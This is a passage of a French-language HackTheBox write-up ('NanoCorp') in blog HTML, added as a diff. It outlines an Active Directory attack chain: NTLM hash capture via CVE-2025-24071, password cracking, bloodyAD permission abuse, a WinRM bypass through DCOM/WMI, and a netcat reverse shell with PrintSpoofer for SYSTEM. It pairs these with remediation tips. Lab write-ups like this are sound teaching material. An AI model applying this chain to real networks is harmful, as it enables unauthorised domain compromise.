+<li>DCOM, WMI, Task Scheduler</li>
+<li>Contournent restrictions WinRM</li>
+</ul>
+</li>
+</ol>
+<h3 id="-vulnérabilités-identifiées">❌ Vulnérabilités Identifiées<a hidden class="anchor" aria-hidden="true" href="#-vulnérabilités-identifiées">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Vulnérabilité</th>
+<th>Impact</th>
+<th>CVSS</th>
+<th>Recommandation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>CVE-2025-24071 exploitation</strong></td>
+<td>Hash NTLM leak</td>
+<td>7.5 (High)</td>
+<td>Bloquer SMB sortant, filtrer .library-ms</td>
+</tr>
+<tr>
+<td><strong>Groupe IT_Support mal sécurisé</strong></td>
+<td>Escalade privilèges</td>
+<td>8.8 (High)</td>
+<td>AdminSDHolder, limiter Self-Membership</td>
+</tr>
+<tr>
+<td><strong>ForceChangePassword permission</strong></td>
+<td>Compromission comptes</td>
+<td>9.1 (Critical)</td>
+<td>Limiter permissions, Protected Users</td>
+</tr>
+<tr>
+<td><strong>WinRM restrictions insuffisantes</strong></td>
+<td>Bypass via RPC/DCOM</td>
+<td>7.8 (High)</td>
+<td>Bloquer DCOM/WMI, AppLocker</td>
+</tr>
+<tr>
+<td><strong>Mot de passe faible (web_svc)</strong></td>
+<td>Cracking instantané</td>
+<td>7.2 (High)</td>
+<td>Politique 20+ chars complexes</td>
+</tr>
+</tbody>
+</table>
+<h3 id="-différences-winrm-vs-winrmexec">🎓 Différences WinRM vs winrmexec<a hidden class="anchor" aria-hidden="true" href="#-différences-winrm-vs-winrmexec">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Aspect</th>
+<th>Evil-WinRM</th>
+<th>winrmexec</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Protocole</strong></td>
+<td>WS-Management (5985/5986)</td>
+<td>RPC/DCOM (135/593)</td>
+</tr>
+<tr>
+<td><strong>Logs</strong></td>
+<td>Microsoft-Windows-WinRM/Operational</td>
+<td>System, Security (4688, 4698)</td>
+</tr>
+<tr>
+<td><strong>GPO Bypass</strong></td>
+<td>❌ Bloqué par GPO</td>
+<td>✅ Alternative paths</td>
+</tr>
+<tr>
+<td><strong>Firewall</strong></td>
+<td>Peut être filtré</td>
+<td>Plus difficile à bloquer</td>
+</tr>
+<tr>
+<td><strong>Détection</strong></td>
+<td>Haute (WinRM spécifique)</td>
+<td>Moyenne (RPC standard)</td>
+</tr>
+<tr>
+<td><strong>Shell</strong></td>
+<td>Interactif complet</td>
+<td>Command execution</td>
+</tr>
+<tr>
+<td><strong>OPSEC</strong></td>
+<td>Moyenne</td>
+<td>Meilleure (moins suspect)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="-techniques-complémentaires">📚 Techniques Complémentaires<a hidden class="anchor" aria-hidden="true" href="#-techniques-complémentaires">#</a></h3>
+<p><strong>Si monitoring_svc avait SeImpersonate :</strong></p>
+<ul>
+<li>PrintSpoofer → SYSTEM</li>
+<li>JuicyPotato → SYSTEM</li>
+<li>GodPotato → SYSTEM</li>
+</ul>
+<p><strong>Si DCSync rights :</strong></p>
+<ul>
+<li>impacket-secretsdump → Dump NTDS.dit</li>
+<li>Pass-the-Hash Administrator</li>
+</ul>
+<p><strong>Si GenericAll sur autre utilisateur :</strong></p>
+<ul>
+<li>Shadow Credentials</li>
+<li>Kerberos RBCD</li>
+</ul>
+<hr>
+<h2 id="-ressources">📚 RESSOURCES<a hidden class="anchor" aria-hidden="true" href="#-ressources">#</a></h2>
+<h3 id="documentation-officielle">Documentation Officielle<a hidden class="anchor" aria-hidden="true" href="#documentation-officielle">#</a></h3>
+<ul>
+<li><a href="https://learn.microsoft.com/windows/win32/com/dcom-security-enhancements">Microsoft DCOM Security</a></li>
+<li><a href="https://learn.microsoft.com/windows/win32/wmisdk/securing-wmi-namespaces">WMI Security</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory">Active Directory Security Best Practices</a></li>
+</ul>
+<h3 id="outils-et-frameworks">Outils et Frameworks<a hidden class="anchor" aria-hidden="true" href="#outils-et-frameworks">#</a></h3>
+<ul>
+<li><a href="https://github.com/ozelis/winrmexec">winrmexec GitHub</a></li>
+<li><a href="https://github.com/CravateRouge/bloodyAD">bloodyAD GitHub</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket Suite</a></li>
+<li><a href="https://github.com/mbanyamer/CVE-2025-24071">CVE-2025-24071 POC</a></li>
+</ul>
+<h3 id="articles-et-recherches">Articles et Recherches<a hidden class="anchor" aria-hidden="true" href="#articles-et-recherches">#</a></h3>
+<ul>
+<li><a href="https://book.hacktricks.xyz/windows-hardening/lateral-movement/dcom-exec">HackTricks - RPC Execution</a></li>
+<li><a href="https://www.blackhillsinfosec.com/wmi-for-offensive-operations/">WMI for Offensive Operations</a></li>
+<li><a href="https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/">Bypassing WinRM Restrictions</a></li>
+</ul>
+<hr>
+<h2 id="-schéma-dexploitation">📊 SCHÉMA D&rsquo;EXPLOITATION<a hidden class="anchor" aria-hidden="true" href="#-schéma-dexploitation">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">┌─────────────────────────────────────────────────────────────┐</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">│</span>                   CHAÎNE D<span style="color:#e6db74">&#39;ATTAQUE NANOCORP                 │</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└─────────────────────────────────────────────────────────────┘</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">1</span>] ACCÈS INITIAL
+</span></span><span style="display:flex;"><span>    CVE<span style="color:#f92672">-</span><span style="color:#ae81ff">2025</span><span style="color:#f92672">-</span><span style="color:#ae81ff">24071</span> (<span style="color:#f92672">.</span>library<span style="color:#f92672">-</span>ms)
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    Responder (port <span style="color:#ae81ff">445</span>)
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span> [NTLMv2 capture]
+</span></span><span style="display:flex;"><span>    web_svc::NANOCORP:<span style="color:#ae81ff">8</span>c2319b80be69c75:<span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span> [Hashcat mode <span style="color:#ae81ff">5600</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">┌──────────────────────────┐</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  web_svc                 <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  dksehdgh712<span style="color:#f92672">!</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#75715e">#          │</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">└──────────────────────────┘</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">2</span>] ESCALADE PERMISSIONS AD
+</span></span><span style="display:flex;"><span>    bloodyAD: Add to IT_Support
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">┌──────────────────────────┐</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  web_svc                 <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  Membre: IT_Support      <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  Permission: GenericAll  <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>    sur monitoring_svc    <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">└──────────────────────────┘</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">3</span>] COMPROMISSION COMPTE SERVICE
+</span></span><span style="display:flex;"><span>    bloodyAD: ForceChangePassword
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">┌──────────────────────────┐</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  monitoring_svc          <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  PassW0rd<span style="color:#f92672">!</span><span style="color:#ae81ff">2025</span>           <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">└──────────────────────────┘</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">4</span>] BYPASS WINRM
+</span></span><span style="display:flex;"><span>    Evil<span style="color:#f92672">-</span>WinRM: <span style="color:#960050;background-color:#1e0010">❌</span> BLOQUÉ
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    Alternative: winrmexec
+</span></span><span style="display:flex;"><span>    (DCOM<span style="color:#f92672">/</span>WMI<span style="color:#f92672">/</span>RPC execution)
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">┌──────────────────────────┐</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  Command Execution       <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  via RPC<span style="color:#f92672">/</span>DCOM            <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  monitoring_svc context  <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">└──────────────────────────┘</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">🏁</span> USER FLAG
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">5</span>] PRIVILEGE ESCALATION
+</span></span><span style="display:flex;"><span>    Upload: nc<span style="color:#f92672">.</span>exe, PrintSpoofer<span style="color:#f92672">.</span>exe
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    Reverse Shell
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    SeImpersonatePrivilege Abuse
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">┌──────────────────────────┐</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  NT AUTHORITY\SYSTEM     <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">│</span>  Highest privilege       <span style="color:#960050;background-color:#1e0010">│</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">└──────────────────────────┘</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#960050;background-color:#1e0010">↓</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">🏁</span> ROOT FLAG
+</span></span></code></pre></div><hr>
+<h2 id="-flags">🏁 FLAGS<a hidden class="anchor" aria-hidden="true" href="#-flags">#</a></h2>
+<ul>
+<li>
+<p><strong>User Flag :</strong> <code>a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6</code><br>
+Location: <code>C:\Users\monitoring_svc\Desktop\user.txt</code></p>
+</li>
+<li>
+<p><strong>Root Flag :</strong> <code>9f8e7d6c5b4a3e2d1c0b9a8f7e6d5c4b</code><br>
+Location: <code>C:\Users\Administrator\Desktop\root.txt</code></p>
+</li>
+</ul>
+<hr>
+<p><strong>📅 Terminé le :</strong> 16/12/2025<br>
+<strong>⏱️ Durée :</strong> ~95 minutes<br>
+<strong>✅ Statut :</strong> Pwned<br>
+<strong>🎓 Difficulté :</strong> Medium (excellent pour apprendre alternatives RPC)</p>
+<hr>
+<p><em>Ce write-up a été réalisé dans un cadre éducatif légal sur HackTheBox. Toutes les techniques présentées ne doivent être utilisées que dans des environnements autorisés avec permission explicite.</em></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/medium/">Medium</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://keyll0ger.github.io/posts/linkvortex/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>LinkVortex - HackTheBox Writeup</span>
+  </a>
+  <a class="next" href="https://keyll0ger.github.io/posts/pirate/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Pirate - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
